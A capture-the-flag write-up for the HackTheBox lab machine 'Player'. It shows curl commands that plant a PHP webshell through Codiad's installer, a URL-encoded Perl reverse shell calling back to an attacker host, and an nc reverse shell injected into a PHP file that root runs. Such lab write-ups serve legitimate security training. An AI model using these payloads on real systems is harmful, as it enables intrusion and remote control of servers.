---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/dWyPVwu9_6g/0.jpg
layout: post
media_subpath: /assets/posts/2020-01-18-player-hackthebox
tags:
- codiad cms
- hackthebox
- linux
- web
title: Player @ HackTheBox
---

Player is a hard [box](https://www.hackthebox.eu/home/machines/profile/196), that we solved in unintended ways that are partly patched now.

{% youtube dWyPVwu9_6g %}

## User & Root

Enumerating subdomains we find: staging.player.htb, dev.player.htb, chat.player.htb. On dev.player.htb we have [codiad cms](https://github.com/Codiad/Codiad), where we can exploit the installer under the condition that a writable directory for the webserver exists, resulting in a shell as www-data (thanks [mprox](https://www.hackthebox.eu/home/users/profile/16690)):

```
# Upload webshell
curl -X POST -d 'project_name=<?php echo system($_GET['xcmd']);?>' -d 'project_path=/var/www/html/launcher/xct/data' -d 'path=/var/www/html/launcher/xct' http://dev.player.htb/components/install/process.php
# Run command
curl http://10.10.10.145/launcher/xct/data/projects.php?xcmd=ls
?php/*|
[{"name":"www-data
www-data","path":"\/var\/www\/html\/launcher\/xct\/data"}]
|*/?>
# Get shell (url encoded perl reverse shell)
curl http://10.10.10.145/launcher/xct/data/projects.php?xcmd=\%70\%65\%72\%6c\%20\%2d\%65\%20\%27\%75\%73\%65\%20\%53\%6f\%63\%6b\%65\%74\%3b\%24\%69\%3d\%22\%31\%30\%2e\%31\%30\%2e\%31\%34\%2e\%35\%22\%3b\%24\%70\%3d\%38\%30\%30\%30\%3b\%73\%6f\%63\%6b\%65\%74\%28\%53\%2c\%50\%46\%5f\%49\%4e\%45\%54\%2c\%53\%4f\%43\%4b\%5f\%53\%54\%52\%45\%41\%4d\%2c\%67\%65\%74\%70\%72\%6f\%74\%6f\%62\%79\%6e\%61\%6d\%65\%28\%22\%74\%63\%70\%22\%29\%29\%3b\%69\%66\%28\%63\%6f\%6e\%6e\%65\%63\%74\%28\%53\%2c\%73\%6f\%63\%6b\%61\%64\%64\%72\%5f\%69\%6e\%28\%24\%70\%2c\%69\%6e\%65\%74\%5f\%61\%74\%6f\%6e\%28\%24\%69\%29\%29\%29\%29\%7b\%6f\%70\%65\%6e\%28\%53\%54\%44\%49\%4e\%2c\%22\%3e\%26\%53\%22\%29\%3b\%6f\%70\%65\%6e\%28\%53\%54\%44\%4f\%55\%54\%2c\%22\%3e\%26\%53\%22\%29\%3b\%6f\%70\%65\%6e\%28\%53\%54\%44\%45\%52\%52\%2c\%22\%3e\%26\%53\%22\%29\%3b\%65\%78\%65\%63\%28\%22\%2f\%62\%69\%6e\%2f\%73\%68\%20\%2d\%69\%22\%29\%3b\%7d\%3b\%27\%20
```

After getting shell metasploits "exploit/linux/local/bpf\_sign\_extension\_priv\_esc" could be used to get root and grab both flags.

Another way for root is to adjust "dee8dc8a47256c64630d803a4c40786g.php" so it gives a shell, because it is included in "/var/lib/playbuff/buff.php", which is called periodically as root (thanks [InfoSecJack](https://twitter.com/InfoSecJack)):

```
printf '%s\n%s' '<?php echo system("mknod /tmp/x p;/bin/sh 0</tmp/x | nc <ip> 8000 1>/tmp/x");?>' "$(cat dee8dc8a47256c64630d803a4c40786g.php)" > dee8dc8a47256c64630d803a4c40786g.php
```